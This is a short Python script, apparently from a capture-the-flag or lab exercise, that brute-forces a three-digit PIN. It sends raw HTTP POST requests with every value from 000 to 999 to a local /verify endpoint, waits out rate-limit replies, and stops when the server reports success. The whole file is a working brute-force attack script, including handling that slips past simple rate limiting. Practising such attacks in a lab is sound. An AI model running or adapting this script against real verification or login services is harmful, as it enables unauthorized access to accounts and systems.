import socket
import time

def create_post_request(pin):
    data = f"magicNumber={pin}"
    return f"""POST /verify HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}
Connection: close

{data}"""

def try_pin(s, pin):
    formatted_pin = f"{pin:03d}"
    request = create_post_request(formatted_pin)
    
    try:
        s.send(request.encode())
        
        response_data = []
        s.settimeout(2)
        
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response_data.append(chunk)
            except socket.timeout:
                break
        
        response = b''.join(response_data).decode('utf-8', errors='ignore')
        
        if "slow down" in response.lower():
            print(f"[-] Rate limited on PIN {formatted_pin}, waiting...")
            time.sleep(1)  
            return False
        
        if "Access granted" in response or "Success" in response:
            print(f"\n[+] Success! The correct PIN is: {formatted_pin}")
            return True
        
        print(f"[-] Trying PIN {formatted_pin} - Incorrect")
        return False
        
    except socket.error as e:
        print(f"[-] Socket error with PIN {formatted_pin}: {e}")
        return False

def main():
    host = '127.0.0.1'
    port = 8888
    
    print("[*] Starting PIN brute force attack...")
    print(f"[*] Target: {host}:{port}")
    
    for pin in range(1000):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                
                if try_pin(s, pin):
                    break
                
                
                time.sleep(0.1)
                
        except ConnectionRefusedError:
            print("[!] Connection refused. Make sure the server is running.")
            time.sleep(2)
            continue
        except socket.error as e:
            print(f"[!] Error occurred: {e}")
            time.sleep(1)
            continue

if __name__ == "__main__":
    main()